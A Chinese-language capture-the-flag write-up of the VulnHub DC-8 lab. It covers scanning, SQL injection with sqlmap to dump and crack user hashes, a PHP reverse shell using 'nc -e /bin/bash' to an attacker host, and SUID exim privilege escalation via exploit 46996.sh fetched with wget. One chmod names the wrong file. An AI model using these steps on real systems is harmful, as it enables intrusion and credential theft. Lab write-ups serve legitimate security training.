> 
>
> [DC-8官网地址]( https://www.vulnhub.com/entry/dc-8,367/)
>
> 

![image-20230809171934780](./imgs/image-20230809171934780.png)

### 信息收集



靶机MAC： 00:0C:29:3A:46:A1



**主机发现**



```shell
nmap -sP  192.168.80.0/24
```

![image-20230809172134027](./imgs/image-20230809172134027.png)

**端口扫描**

```shell
nmap -A -p- 192.168.80.142
```

![image-20230809172243707](./imgs/image-20230809172243707.png)

访问80端口

![image-20230809172336591](./imgs/image-20230809172336591.png)

点击页面能点击的地方，发现每点击一个链接，地址栏的`?nid=`后面的数字就会变

![image-20230809172456660](./imgs/image-20230809172456660.png)



尝试在数字后面加个 `'`引号，发现出现sql报错信息，就可以sql注入

![image-20230809172539702](./imgs/image-20230809172539702.png)

### 漏洞利用

**sqlmap**

列出所有数据库

```shell
sqlmap -u "http://192.168.80.142?nid=2" --risk=3 --level=5  --dbs --batch
```



![image-20230809173721854](./imgs/image-20230809173721854.png)

列出指定数据库的所有表

```shell
sqlmap -u "http://192.168.80.142?nid=2" --risk=3  --level=5 --random-agent  -D d7db --tables
```

![image-20230809173844344](./imgs/image-20230809173844344.png)

列出所有字段

```shell
sqlmap -u "http://192.168.80.142?nid=2" --risk=3  --level=5 --random-agent  -D d7db -T users --columns
```

![image-20230809173936157](./imgs/image-20230809173936157.png)

列出用户名和密码

```shell
sqlmap -u "http://192.168.80.142?nid=2" --risk=3  --level=5 --random-agent  -D d7db -T users -C name,pass --dump
```

![image-20230809174018217](./imgs/image-20230809174018217.png)

将两个密码放到`hash.txt`，借用`john`工具来解密

```shell
john hash.txt
```



![image-20230809174244527](./imgs/image-20230809174244527.png)

![image-20230809174317253](./imgs/image-20230809174317253.png)

使用`ssh`登录，发现没有权限

![image-20230809174810350](./imgs/image-20230809174810350.png)

然后爆破一下目录，找找登录的界面

```shell
dirsearch -u 192.168.80.142 -i 200
```

![image-20230809174914940](./imgs/image-20230809174914940.png)

使用`admin`用户登录，登录失败，那就换一个用户

![image-20230809174848608](./imgs/image-20230809174848608.png)

`john`用户登录成功

![image-20230809175002880](./imgs/image-20230809175002880.png)

找到可以提交`php`代码的地方，写入反弹shell

```php
<p>zzzzz</p>
<?php
@exec("nc -e /bin/bash 192.168.80.141 7777");
?> 
```

kali先开启 监听

![image-20230809191032412](./imgs/image-20230809191032412.png)

![image-20230809191054372](./imgs/image-20230809191054372.png)

往下滑动，保存配置

![image-20230809183905865](./imgs/image-20230809183905865.png)

![image-20230809183948074](./imgs/image-20230809183948074.png)

反弹成功！！

![image-20230809191144810](./imgs/image-20230809191144810.png)

### suid提权

```shell
find / -user root -perm /4000 2>/dev/null
```



![image-20230809191556479](./imgs/image-20230809191556479.png)

漏洞搜索

```shell
searchsploit exim 4.8
```



![image-20230809193731692](./imgs/image-20230809193731692.png)

找出绝对路径

```shell
 searchsploit -p linux/local/46996.sh 
```



![image-20230809193849194](./imgs/image-20230809193849194.png)

复制一份保存到桌面

```shell
cp /usr/share/exploitdb/exploits/linux/local/46996.sh  46996.sh 

```

![image-20230809194010510](./imgs/image-20230809194010510.png)

在桌面路径下开启http服务

```shell
python -m http.server 8080   
```

![image-20230809192423201](./imgs/image-20230809192423201.png)

在交互shell里`wget`下载

```shell
wget http://192.168.80.141:8080/46996.sh
```



![image-20230809194153729](./imgs/image-20230809194153729.png)



```shell
chmod 777 39535.sh
```

![image-20230809194251954](./imgs/image-20230809194251954.png)

查看`46996.sh`

![image-20230809194341594](./imgs/image-20230809194341594.png)

**提权**

![image-20230809194516772](./imgs/image-20230809194516772.png)

![image-20230809194546076](./imgs/image-20230809194546076.png)

提权虽然成功，但是它 过一会就自动没有root权限了